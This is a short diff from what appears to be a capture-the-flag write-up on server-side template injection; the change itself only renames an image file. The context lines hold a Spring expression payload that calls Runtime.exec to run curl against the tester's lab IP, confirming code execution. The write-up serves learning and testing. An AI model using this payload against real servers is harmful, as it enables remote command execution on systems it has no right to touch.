@@ -87,7 +87,7 @@ This confirms that SSTI works, and the payload was taken from a Freemarker cheat
 <pre><code><strong>*{T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.13/sstirce')}
 </strong></code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (680) (1).png" alt=""><figcaption></figcaption></figure>
 
 From this, I will get a hit back on my Python server:
 
